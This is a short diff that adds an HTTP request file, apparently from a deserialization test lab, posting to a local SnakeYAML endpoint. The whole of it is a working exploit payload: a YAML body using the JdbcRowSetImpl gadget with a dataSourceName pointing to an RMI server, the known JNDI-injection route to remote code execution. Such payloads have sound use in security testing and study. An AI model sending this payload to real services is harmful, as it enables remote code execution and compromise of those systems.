@@ -1,0 +1,9 @@
+###
+# snakeyaml
+POST /deserialization/snakeyaml/case1 HTTP/1.1
+Host: 127.0.0.1:8080
+Content-Type: text/plain
+
+!!com.sun.rowset.JdbcRowSetImpl
+ dataSourceName: "rmi://127.0.0.1:1099/rw35lr"
+ autoCommit: true
